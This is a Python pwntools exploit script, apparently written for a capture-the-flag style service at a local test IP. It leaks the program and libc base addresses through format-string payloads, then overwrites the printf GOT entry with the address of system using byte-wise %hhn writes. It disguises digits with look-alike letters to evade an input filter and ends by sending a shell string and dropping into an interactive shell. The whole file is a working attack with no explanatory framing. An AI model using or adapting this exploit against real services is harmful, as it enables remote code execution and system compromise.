```python
from pwn import *
ip="172.17.0.3" # test ip
port=9999
conn=connect(ip,port)
libc=ELF('./libc.so.6')


system_libc=libc.sym['system']
printf_libc=libc.sym['printf']
write_libc=libc.sym['write']


printf_got_offset=0x0000000000004038
io_ret_offset=0x0000000000001523

# leak .text base address
payload1=b'%zi$p'
conn.recvline()
conn.sendline(payload1)
conn.recvline()
text_base=int(conn.recvline()[:-1].decode(),16)-io_ret_offset


printf_got=printf_got_offset+text_base

# leak libc base address
payload2=b'%3$p'
conn.recvline()
conn.sendline(payload2)
conn.recvline()
libc_base=int(conn.recvline()[:-1].decode(),16)-(write_libc+23)


system_addr=system_libc+libc_base


byte1=system_addr&0xff
byte2=(system_addr>>8)&0xff
byte3=(system_addr>>16)&0xff


send_str_list=[str(byte1),str((byte2-byte1)%0x100),str((byte3-byte2)%0x100)]

for i in range(len(send_str_list)):
    send_str_list[i]=send_str_list[i].replace('1','l').replace('2','z').replace('4','A').replace('6','b').replace('9','q').replace('0','o')

# change got (printf to system)
payload3 = '%{}C%l3$hhn'.format(send_str_list[0]).encode()
payload3 += '%{}C%lA$hhn'.format(send_str_list[1]).encode()
payload3 += '%{}C%l5$hhn'.format(send_str_list[2]).encode()
payload3 = payload3.ljust(12 * 3 + 4, b'\x00')	
payload3 += p64(printf_got) + p64(printf_got+1) + p64(printf_got+2)

conn.sendline(payload3)
conn.sendline(b'/61n/sh\0')

conn.interactive()
```